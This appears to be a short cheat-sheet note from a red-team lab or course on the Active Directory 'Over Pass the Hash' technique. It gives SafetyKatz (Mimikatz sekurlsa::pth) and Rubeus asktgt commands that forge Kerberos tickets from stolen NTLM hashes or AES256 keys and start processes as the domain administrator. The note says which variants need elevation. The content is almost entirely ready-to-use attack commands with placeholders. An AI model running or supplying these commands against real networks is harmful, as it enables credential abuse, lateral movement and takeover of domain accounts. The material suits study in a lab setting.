Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator)
```
SafetyKatz.exe "sekurlsa::pth /user:administrator
/domain: dollarcorp.moneycorp.local
/aes256:<aes256keys> /run:cmd.exe" "exit"
```

*  The above commands starts a process with a logon type 9 (same as runas /netonly).

* Over Pass the hash (OPTH) generate tokens from hashes or keys.
* Below doesn't need elevation
```
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```

* Below command needs elevation
```
Rubeus.exe asktgt /user:administrator
/aes256:<aes256keys> /opsec
/createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```


